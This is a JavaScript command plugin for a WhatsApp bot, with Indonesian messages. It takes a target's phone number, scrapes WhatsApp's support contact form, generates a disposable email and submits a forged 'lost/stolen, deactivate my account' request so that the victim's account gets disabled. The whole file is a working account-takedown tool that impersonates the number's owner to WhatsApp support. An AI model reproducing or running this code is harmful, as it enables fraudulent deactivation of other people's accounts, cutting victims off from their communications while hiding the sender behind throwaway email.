/**
 * Made By Fokus ID and Y-Dev
 */

import axios from "axios";
import {
    load
} from "cheerio";
let handler = async (m, {
    conn,
    text,
    usedPrefix,
    command
}) => {
    let nomor = m.mentionedJid?.[0] || m.quoted?.sender || text?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    nomor = nomor.replace(/[^0-9]/g, '');
    if (!nomor) throw `*Send Nomor Yang Ingin Di Report!*\n\ncontoh:\n${usedPrefix + command} 628xxxx`;
    try {
        let p = await axios.get("https://www.whatsapp.com/contact/noclient/");
        let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10");
        let cookie = p.headers["set-cookie"].join("; ");
        const $ = load(p.data);
        let Form = $("form");
        let action = Form.attr("action");
        let url = new URL(action, "https://www.whatsapp.com").href;
        let form = new URLSearchParams();

        form.append("jazoest", Form.find("input[name=jazoest]").val());
        form.append("lsd", Form.find("input[name=lsd]").val());
        form.append("step", "submit");
        form.append("country_selector", "ID");
        form.append("phone_number", nomor);
        form.append("email", email.data[0]);
        form.append("email_confirm", email.data[0]);
        form.append("platform", "ANDROID");
        form.append("your_message", "Pordido/roubado: desative minha conta");
        form.append("__user", "0");
        form.append("__a", "1");
        form.append("__csr", "");
        form.append("__req", "8");
        form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
        form.append("dpr", "1");
        form.append("__ccg", "UNKNOWN");
        form.append("__rev", "1006630858");
        form.append("__comment_req", "0");

        let {
            data
        } = await axios({
            method: "POST",
            url: url,
            headers: {
                cookie
            },
            data: form
        });
        if (!data) throw "Error";
        data = JSON.parse(data.replace("for (;;);", ""));
        if (!data.payload) throw "Gagal report nomor tersebut!";
        return await m.reply(`@${nomor} berhasil di report!\nMohon Tunggu *1 JAM* Lagi Untuk Menggunakan Fitur Ini!`);
    } catch (e) {
        console.error(e);
        throw e;
    }
};
handler.help = ["verif", "kenon", "logout"]
handler.command = /^(verif|kenon|logout)$/i
handler.rowner = true

export default handler;